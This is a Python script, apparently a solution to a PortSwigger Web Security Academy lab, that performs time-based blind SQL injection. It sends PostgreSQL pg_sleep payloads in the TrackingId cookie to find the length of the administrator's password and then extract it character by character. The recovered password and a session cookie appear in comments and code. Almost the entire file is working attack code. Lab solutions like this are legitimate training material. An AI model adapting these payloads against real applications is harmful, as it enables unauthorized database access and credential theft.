import requests
import string
import time

url = 'https://acf11f6d1e340cc9c0f309e2008300ae.web-security-academy.net'

# get password length 20
def checkLength():
    for i in range(0, 50):
        # if password length = num then true else false where username = 'administrator'
        payload = ''' ' || (select CASE WHEN (length(password)={}) THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username = 'administrator')  -- - '''.format(str(i))

        start = time.time()
        requests.get(url, cookies={
            'TrackingId': payload,
            'session': 'UjBdscRjXp8Tvkg7OE6VzTXxy45hf1XO'
        })
        end = time.time()

        print(payload)
        if (end - start) >= 5:
            print(i)
            break

# get password x3hj3t8p422876egg2g5
def getPassword():
    password = ''
    for i in range(1, 21):
        for j in string.printable:
            payload = ''' ' || (select CASE WHEN (substr(password,{},1)='{}') THEN pg_sleep(5) ELSE pg_sleep(0) END from users where username = 'administrator')  -- -  '''.format(str(i), str(j))

            start = time.time()
            response = requests.get(url, cookies={
                'TrackingId': payload,
                'session': 'UjBdscRjXp8Tvkg7OE6VzTXxy45hf1XO'
            })
            end = time.time()

            print(payload)
            if (end - start) >= 5:
                password += j
                print(password)
                break

checkLength()
getPassword()

# response = requests.get(url, cookies={
#     'TrackingId': ''' ' || (select CASE WHEN (substr(password,1,1)>'0') THEN pg_sleep(10) ELSE pg_sleep(0) END from users where username = 'administrator')  -- -  ''',
#     'session': '04vwIeGXYQxrIZEuyuLKtSIQRZ48NpT9'
# })

# print(response.text)